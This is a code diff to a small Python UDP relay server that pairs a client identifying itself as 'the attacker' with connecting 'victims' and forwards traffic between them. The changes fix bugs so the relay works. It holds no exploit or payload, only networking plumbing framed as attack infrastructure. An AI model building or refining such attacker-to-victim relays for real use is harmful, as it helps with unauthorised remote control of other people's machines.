@@ -6,16 +6,18 @@ from threading import Thread
 def forward(server_socket: socket.socket, atacker_ip: tuple, targeted_victim_ip: tuple):
     while 1:
         data, ip = server_socket.recvfrom(1024)
-        if ip is atacker_ip:
-            server_socket.sendto(data=data, address=targeted_victim_ip)
+        if ip == atacker_ip:
+            server_socket.sendto(data, targeted_victim_ip)
+            print('sent to victim')
         elif ip is targeted_victim_ip:
-            server_socket.sendto(data=data, address=atacker_ip)
+            server_socket.sendto(data, atacker_ip)
 
 
-def accept_for_new_victims(server_socket_for_new_users, victims_ip_list):
+def accept_for_new_victims(server_socket_for_new_users: socket.socket, victims_ip_list: list):
     while 1:
         print("waitin for a victim")
         ip = server_socket_for_new_users.recvfrom(1024)[1]
+        server_socket_for_new_users.sendto('x'.encode(), ip)
         victims_ip_list.append(ip)
 
 
@@ -36,13 +38,14 @@ def main():
     if data == "i am the attacker":
         print("attacker_conected")
         attacker_ip = ip
+        socket_for_attacker.sendto('x'.encode(), attacker_ip)
     print(attacker_ip)
     Thread(target=accept_for_new_victims, args=(socket_for_victims, victims_ip_list)).start()
     while not victims_ip_list:
         pass
     targeted_victim_ip = victims_ip_list[0]
     print(targeted_victim_ip, "is the target")
-    Thread(target=forward, args=(server_socket, attacker_ip, targeted_victim_ip))
+    Thread(target=forward, args=(server_socket, attacker_ip, targeted_victim_ip)).start()
 
 
 if __name__ == "__main__":
